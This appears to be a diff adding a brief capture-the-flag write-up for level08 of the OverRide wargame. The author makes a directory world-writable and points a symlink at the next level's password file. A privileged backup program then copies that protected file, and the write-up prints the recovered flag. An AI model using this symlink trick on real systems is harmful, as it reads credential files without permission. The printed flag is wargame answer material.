@@ -1,0 +1,29 @@
+
+
+this level has a trick to it it takes a file and do a backup to it in 
+"./backup" path
+
+but when we try to pass the "/home/users/level09/.pass" we don't ge the permession
+on that file
+
+so the first idea we got and that logically works is the symbolic link
+
+we created a file first int the place wehre we are:
+--------------------------------
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ touch new_file
+level08@OverRide:~$ ln -sf /home/users/level09/.pass ./new_file
+--------------------------------
+
+and then passed the file to the program:
+--------------------------------
+level08@OverRide:~$ ./level08 new_file
+--------------------------------
+
+after checking the backup we got our file with flag:
+--------------------------------
+level08@OverRide:~$ cd backups/
+level08@OverRide:~/backups$ cat new_file
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+level08@OverRide:~/backups$
+--------------------------------
